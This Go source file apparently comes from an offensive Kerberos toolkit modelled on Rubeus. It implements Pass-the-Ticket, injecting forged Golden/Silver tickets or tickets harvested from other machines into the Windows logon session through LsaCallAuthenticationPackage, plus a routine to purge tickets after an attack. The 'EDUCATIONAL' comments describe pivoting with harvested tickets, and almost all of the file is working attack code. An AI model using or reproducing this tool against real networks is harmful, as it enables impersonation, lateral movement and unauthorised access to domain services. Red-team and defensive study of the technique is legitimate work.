//go:build windows
// +build windows

package windows

import (
	"fmt"
	"unsafe"

	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Pass-the-Ticket (PTT)
//
// PTT injects a Kerberos ticket into the current session's ticket cache.
// After injection, Windows will use this ticket for authentication.
//
// Use cases:
//   - Use a Golden/Silver ticket we forged
//   - Use a ticket extracted from another machine
//   - Pivot with a harvested ticket
//
// How it works:
// 1. Parse the .kirbi to get the ticket
// 2. Build KERB_SUBMIT_TKT_REQUEST message
// 3. Call LsaCallAuthenticationPackage
// 4. Windows caches the ticket
//
// Note: PT can only inject into your own session unless elevated.

// KERB_PROTOCOL_MESSAGE_TYPE constants
const (
	KerbDebugRequestMessage                 = 0
	KerbQueryTicketCacheMessage             = 1
	KerbChangeMachinePasswordMessage        = 2
	KerbVerifyPacMessage                    = 3
	KerbRetrieveTicketMessage               = 4
	KerbUpdateAddressesMessage              = 5
	KerbPurgeTicketCacheMessage             = 6
	KerbChangePasswordMessage               = 7
	KerbRetrieveEncodedTicketMessage        = 8
	KerbDecryptDataMessage                  = 9
	KerbAddBindingCacheEntryMessage         = 10
	KerbSetPasswordMessage                  = 11
	KerbSetPasswordExMessage                = 12
	KerbVerifyCredentialsMessage            = 13
	KerbQueryTicketCacheExMessage           = 14
	KerbPurgeTicketCacheExMessage           = 15
	KerbRefreshSmartcardCredentialsMessage  = 16
	KerbAddExtraCredentialsMessage          = 17
	KerbQuerySupplementalCredentialsMessage = 18
	KerbTransferCredentialsMessage          = 19
	KerbQueryTicketCacheEx2Message          = 20
	KerbSubmitTicketMessage                 = 21
	KerbAddExtraCredentialsExMessage        = 22
	KerbQueryKdcProxyCacheMessage           = 23
	KerbPurgeKdcProxyCacheMessage           = 24
	KerbQueryTicketCacheEx3Message          = 25
	KerbCleanupMachinePkinitCredsMessage    = 26
	KerbAddBindingCacheEntryExMessage       = 27
	KerbQueryBindingCacheMessage            = 28
	KerbPurgeBindingCacheMessage            = 29
	KerbPinKdcMessage                       = 30
	KerbUnpinAllKdcsMessage                 = 31
	KerbQueryDomainExtendedPoliciesMessage  = 32
	KerbQueryS4U2ProxyCacheMessage          = 33
)

// PassTheTicket injects a ticket into the current session.
//
// EDUCATIONAL: PTT Injection
//
// This is how we use forged or harvested tickets:
// 1. Load the .kirbi
// 2. Call this function
// 3. Windows now has the ticket cached
// 4. Any auth to the ticket's service uses it!
func PassTheTicket(kirbi *ticket.Kirbi) error {
	if kirbi == nil {
		return fmt.Errorf("invalid ticket")
	}

	// Check if we have either parsed Cred or RawBytes
	if kirbi.Cred == nil && len(kirbi.RawBytes) == 0 {
		return fmt.Errorf("invalid ticket: no credential data")
	}

	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return fmt.Errorf("failed to connect to LSA: %w", err)
	}
	defer lsaDisconnect(handle)

	// Get Kerberos package
	packageID, err := lsaLookupKerberosPackage(handle)
	if err != nil {
		return fmt.Errorf("failed to lookup Kerberos package: %w", err)
	}

	// Marshal the ticket to bytes
	// Use RawBytes if available (from tgtdeleg), otherwise marshal from Cred
	var ticketBytes []byte
	if len(kirbi.RawBytes) > 0 {
		ticketBytes = kirbi.RawBytes
	} else {
		ticketBytes, err = kirbi.ToBytes()
		if err != nil {
			return fmt.Errorf("failed to marshal ticket: %w", err)
		}
	}

	// Build submit request
	// KERB_SUBMIT_TKT_REQUEST structure (matches Rubeus exactly):
	//   MessageType: KERB_PROTOCOL_MESSAGE_TYPE (4 bytes)
	//   LogonId: LUID (8 bytes)
	//   Flags: int32 (4 bytes)
	//   Key: KERB_CRYPTO_KEY32 (12 bytes) - left as zeros, key is in KRB-CRED
	//     - KeyType: int32
	//     - Length: int32
	//     - Offset: int32
	//   KerbCredSize: int32 (4 bytes)
	//   KerbCredOffset: int32 (4 bytes)
	// Total header: 36 bytes

	headerSize := 36
	requestSize := headerSize + len(ticketBytes)
	request := make([]byte, requestSize)

	// MessageType = KerbSubmitTicketMessage (21)
	*(*int32)(unsafe.Pointer(&request[0])) = int32(KerbSubmitTicketMessage)
	// LogonId = 0 (current session) - bytes 4-11
	// Flags = 0 - bytes 12-15
	// Key = zeros (KeyType=0, Length=0, Offset=0) - bytes 16-27
	// The session key is contained in the KRB-CRED enc-part, not passed separately

	// KerbCredSize
	*(*int32)(unsafe.Pointer(&request[28])) = int32(len(ticketBytes))
	// KerbCredOffset - right after the header (same as Rubeus: Marshal.SizeOf(KERB_SUBMIT_TKT_REQUEST))
	*(*int32)(unsafe.Pointer(&request[32])) = int32(headerSize)
	// Copy ticket data
	copy(request[headerSize:], ticketBytes)

	// Call LSA
	var response unsafe.Pointer
	var responseSize uint32
	var protocolStatus int32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&request[0])),
		uintptr(len(request)),
		uintptr(unsafe.Pointer(&response)),
		uintptr(unsafe.Pointer(&responseSize)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if response != nil {
		procLsaFreeReturnBuffer.Call(uintptr(response))
	}

	if ret != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%08X", uint32(ret))
	}
	if protocolStatus != 0 {
		// Convert to unsigned for proper hex display
		status := uint32(protocolStatus)
		errDesc := describeNTStatus(status)
		return fmt.Errorf("Kerberos returned error: 0x%08X (%s)", status, errDesc)
	}

	return nil
}

// PurgeTickets purges tickets from the current session.
//
// EDUCATIONAL: Ticket Purging
//
// Purging the ticket cache is useful for:
//   - Clearing stale credentials
//   - Forcing re-authentication
//   - Testing fresh ticket acquisition
//   - Cleaning up after PTT attacks
//
// Parameters:
//   - all: if true, purge all tickets
//   - serverName: if not empty, purge only tickets for this server
func PurgeTickets(all bool, serverName string) error {
	handle, err := lsaConnect()
	if err != nil {
		return err
	}
	defer lsaDisconnect(handle)

	packageID, err := lsaLookupKerberosPackage(handle)
	if err != nil {
		return err
	}

	// KERB_PURGE_TKT_CACHE_REQUEST:
	//   MessageType: DWORD (4 bytes)
	//   LogonId: LUID (8 bytes)
	//   ServerName: UNICODE_STRING (16 bytes on 64-bit)
	//   RealmName: UNICODE_STRING (16 bytes on 64-bit)

	var request []byte
	if all || serverName == "" {
		// Purge all tickets - send empty UNICODE_STRINGs
		request = make([]byte, 48)
		request[0] = byte(KerbPurgeTicketCacheMessage)
	} else {
		// Purge specific server
		serverUTF16 := encodeUTF16(serverName)
		request = make([]byte, 48+len(serverUTF16))
		request[0] = byte(KerbPurgeTicketCacheMessage)

		// ServerName UNICODE_STRING at offset 12 (after MessageType + LUID)
		*(*uint16)(unsafe.Pointer(&request[12])) = uint16(len(serverUTF16))
		*(*uint16)(unsafe.Pointer(&request[14])) = uint16(len(serverUTF16))
		*(*uintptr)(unsafe.Pointer(&request[24])) = uintptr(unsafe.Pointer(&request[48]))

		copy(request[48:], serverUTF16)
	}

	var response unsafe.Pointer
	var responseSize uint32
	var protocolStatus int32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&request[0])),
		uintptr(len(request)),
		uintptr(unsafe.Pointer(&response)),
		uintptr(unsafe.Pointer(&responseSize)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if response != nil {
		procLsaFreeReturnBuffer.Call(uintptr(response))
	}

	if ret != 0 || protocolStatus != 0 {
		return fmt.Errorf("purge failed: LSA=0x%x, Protocol=0x%x", ret, protocolStatus)
	}

	return nil
}

// encodeUTF16 converts a string to UTF-16LE bytes
func encodeUTF16ptt(s string) []byte {
	result := make([]byte, len(s)*2)
	for i, r := range s {
		result[i*2] = byte(r)
		result[i*2+1] = byte(r >> 8)
	}
	return result
}

// describeNTStatus returns a human-readable description for common error codes
func describeNTStatus(status uint32) string {
	switch status {
	case 0x0000006E:
		return "KDC_ERR_CLIENT_REVOKED"
	case 0x00000096:
		return "KDC_ERR_REVOKED"
	case 0xC000006D:
		return "STATUS_LOGON_FAILURE"
	case 0xC0000022:
		return "STATUS_ACCESS_DENIED"
	case 0xC000009A:
		return "STATUS_INSUFFICIENT_RESOURCES"
	case 0xC0000064:
		return "STATUS_NO_SUCH_USER"
	case 0xC00000BB:
		return "STATUS_NOT_SUPPORTED"
	case 0xC0000098:
		return "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"
	case 0xC0000234:
		return "STATUS_ACCOUNT_LOCKED_OUT"
	case 0xC000005E:
		return "STATUS_NO_LOGON_SERVERS"
	case 0xC0000380:
		return "STATUS_SMARTCARD_SUBSYSTEM_FAILURE"
	case 0xC0000388:
		return "STATUS_DOWNGRADE_DETECTED"
	default:
		if status >= 0x40000000 && status < 0x80000000 {
			return "KERB_ERROR"
		}
		return "UNKNOWN"
	}
}
